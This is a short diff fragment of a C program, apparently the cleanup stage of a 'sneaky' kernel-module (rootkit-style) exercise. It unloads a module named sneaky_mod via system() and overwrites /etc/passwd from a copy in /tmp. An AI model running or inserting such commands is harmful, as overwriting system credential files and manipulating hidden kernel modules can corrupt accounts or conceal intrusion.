@@ -33,7 +33,7 @@ int main() {
   // Step 4: wait for 'q'
   waitq();
   // Step5: 
-  system("rmmod sneaky_mod");
+  system("rmmod sneaky_mod.ko");
   system("cp /tmp/passwd /etc/passwd");
   system("rm /tmp/passwd");
 
